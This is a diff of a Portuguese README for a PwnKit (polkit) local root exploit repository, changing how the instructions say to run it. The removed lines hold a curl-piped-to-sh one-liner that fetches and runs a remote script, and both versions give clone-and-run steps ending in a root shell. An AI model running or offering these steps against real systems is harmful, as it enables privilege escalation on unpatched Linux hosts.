@@ -15,16 +15,11 @@ Mais detalhes de como funciona a vulnerabilidade ![aqui](https://blog.qualys.com
 O exploit vai funcionar instantaneamente em distribuições vulneráveis baseadas em Debian, Ubuntu, Fedora e CentOS. Foi criado para fins de estudos sobre a vulnerabilidade e até onde eu consigo chegar atualmente sozinho com a linguagem C. Não use isso para fazer o que não deve.
 
 ```bash
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/Nosferatuvjr/PwnKit/main/PwnKit.sh)"
-```
-
-### Manual
-
-```bash
-git clone https://github.com/Nosferatuvjr/PwnKit
-chmod +x ./PwnKit
-./PwnKit # interactive shell
-./PwnKit 'id' # single command
+$ git clone https://github.com/Nosferatuvjr/PwnKit
+$ cd PwnKit
+$ chmod +x ./PwnKit.sh
+$ ./PwnKit.sh
+# id
 ```
 
 ### Showcase
